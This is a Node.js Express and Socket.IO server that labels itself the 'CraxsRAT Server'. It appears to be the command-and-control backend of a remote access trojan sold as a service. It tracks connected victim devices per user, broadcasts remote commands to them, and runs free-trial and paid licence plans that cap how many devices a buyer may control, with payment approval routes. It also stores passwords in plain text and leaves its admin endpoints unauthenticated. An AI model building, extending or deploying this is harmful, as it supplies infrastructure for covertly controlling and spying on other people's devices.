const express = require('express');
const http = require('http');
const socketIO = require('socket.io');
const cors = require('cors');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = socketIO(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const PORT = process.env.PORT || 5000;

// In-memory storage (replace with MongoDB later)
const devices = new Map();
const users = new Map();
const payments = new Map();

console.log('🚀 Server starting...');
console.log('📊 Environment:', process.env.NODE_ENV || 'development');

// Socket.IO connection handling
io.on('connection', (socket) => {
    console.log('✅ New connection:', socket.id);

    // Device connection
    socket.on('device:connect', (data) => {
        try {
            devices.set(data.deviceId, {
                socketId: socket.id,
                userId: data.userId,
                deviceInfo: data.deviceInfo,
                connectedAt: new Date(),
                online: true
            });
            console.log('📱 Device connected:', data.deviceId);
            
            // Notify user
            io.emit('device:list', Array.from(devices.values()));
        } catch (error) {
            console.error('❌ Device connect error:', error);
        }
    });

    // Device command
    socket.on('device:command', (data) => {
        try {
            console.log('📤 Command received:', data.command);
            socket.broadcast.emit('device:response', data);
        } catch (error) {
            console.error('❌ Command error:', error);
        }
    });

    // Device refresh
    socket.on('device:refresh', (data) => {
        try {
            const userDevices = Array.from(devices.values())
                .filter(d => d.userId === data.userId);
            socket.emit('device:list', userDevices);
        } catch (error) {
            console.error('❌ Refresh error:', error);
        }
    });

    // Disconnect
    socket.on('disconnect', () => {
        console.log('❌ Disconnected:', socket.id);
        
        // Mark device as offline
        for (let [deviceId, device] of devices.entries()) {
            if (device.socketId === socket.id) {
                device.online = false;
                console.log('📱 Device offline:', deviceId);
            }
        }
        
        io.emit('device:list', Array.from(devices.values()));
    });
});

// REST API Routes

// Health check
app.get('/', (req, res) => {
    res.json({ 
        message: '🦅 CraxsRAT Server Running',
        status: 'online',
        devices: devices.size,
        users: users.size,
        timestamp: new Date().toISOString()
    });
});

// Get server stats
app.get('/api/stats', (req, res) => {
    res.json({
        totalDevices: devices.size,
        onlineDevices: Array.from(devices.values()).filter(d => d.online).length,
        totalUsers: users.size,
        totalPayments: payments.size
    });
});

// User registration
app.post('/api/register', (req, res) => {
    try {
        const { fullName, email, password } = req.body;
        
        if (users.has(email)) {
            return res.status(400).json({ error: 'User already exists' });
        }
        
        const user = {
            fullName,
            email,
            password, // In production, hash this!
            createdAt: new Date(),
            license: {
                plan: 'Free Trial',
                maxDevices: 1,
                daysRemaining: 7,
                expiryDate: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
                status: 'active'
            }
        };
        
        users.set(email, user);
        
        res.json({ 
            success: true, 
            message: 'User registered successfully',
            user: { email, fullName, license: user.license }
        });
    } catch (error) {
        console.error('❌ Registration error:', error);
        res.status(500).json({ error: 'Registration failed' });
    }
});

// User login
app.post('/api/login', (req, res) => {
    try {
        const { email, password } = req.body;
        
        const user = users.get(email);
        
        if (!user || user.password !== password) {
            return res.status(401).json({ error: 'Invalid credentials' });
        }
        
        res.json({ 
            success: true, 
            message: 'Login successful',
            user: { 
                email: user.email, 
                fullName: user.fullName, 
                license: user.license 
            }
        });
    } catch (error) {
        console.error('❌ Login error:', error);
        res.status(500).json({ error: 'Login failed' });
    }
});

// Submit payment
app.post('/api/payment', (req, res) => {
    try {
        const { userId, plan, amount, method } = req.body;
        
        const payment = {
            id: Date.now().toString(),
            userId,
            plan,
            amount,
            method,
            status: 'pending',
            submittedAt: new Date()
        };
        
        payments.set(payment.id, payment);
        
        res.json({ 
            success: true, 
            message: 'Payment submitted successfully',
            paymentId: payment.id
        });
    } catch (error) {
        console.error('❌ Payment error:', error);
        res.status(500).json({ error: 'Payment submission failed' });
    }
});

// Get devices for user
app.get('/api/devices/:userId', (req, res) => {
    try {
        const { userId } = req.params;
        
        const userDevices = Array.from(devices.values())
            .filter(d => d.userId === userId);
        
        res.json({ 
            success: true, 
            devices: userDevices 
        });
    } catch (error) {
        console.error('❌ Get devices error:', error);
        res.status(500).json({ error: 'Failed to get devices' });
    }
});

// Admin: Get all users
app.get('/api/admin/users', (req, res) => {
    try {
        const allUsers = Array.from(users.values()).map(u => ({
            email: u.email,
            fullName: u.fullName,
            createdAt: u.createdAt,
            license: u.license
        }));
        
        res.json({ 
            success: true, 
            users: allUsers 
        });
    } catch (error) {
        console.error('❌ Get users error:', error);
        res.status(500).json({ error: 'Failed to get users' });
    }
});

// Admin: Get all payments
app.get('/api/admin/payments', (req, res) => {
    try {
        const allPayments = Array.from(payments.values());
        
        res.json({ 
            success: true, 
            payments: allPayments 
        });
    } catch (error) {
        console.error('❌ Get payments error:', error);
        res.status(500).json({ error: 'Failed to get payments' });
    }
});

// Admin: Approve payment
app.post('/api/admin/payment/approve/:paymentId', (req, res) => {
    try {
        const { paymentId } = req.params;
        
        const payment = payments.get(paymentId);
        
        if (!payment) {
            return res.status(404).json({ error: 'Payment not found' });
        }
        
        payment.status = 'approved';
        payment.approvedAt = new Date();
        
        // Update user license
        const user = users.get(payment.userId);
        if (user) {
            user.license = {
                plan: payment.plan,
                maxDevices: payment.plan === 'Basic' ? 3 : payment.plan === 'Premium' ? 10 : 100,
                daysRemaining: payment.plan === 'Basic' ? 30 : payment.plan === 'Premium' ? 90 : 365,
                expiryDate: new Date(Date.now() + (payment.plan === 'Basic' ? 30 : payment.plan === 'Premium' ? 90 : 365) * 24 * 60 * 60 * 1000),
                status: 'active'
            };
        }
        
        res.json({ 
            success: true, 
            message: 'Payment approved and license activated' 
        });
    } catch (error) {
        console.error('❌ Approve payment error:', error);
        res.status(500).json({ error: 'Failed to approve payment' });
    }
});

// Error handling
app.use((err, req, res, next) => {
    console.error('❌ Server error:', err);
    res.status(500).json({ error: 'Internal server error' });
});

// Start server
server.listen(PORT, () => {
    console.log('✅ Server running on port', PORT);
    console.log('🌐 Access at: http://localhost:' + PORT);
    console.log('📱 Socket.IO ready for connections');
    console.log('💾 Using in-memory storage (no MongoDB required)');
});

// Graceful shutdown
process.on('SIGTERM', () => {
    console.log('👋 SIGTERM received, shutting down gracefully');
    server.close(() => {
        console.log('✅ Server closed');
        process.exit(0);
    });
});
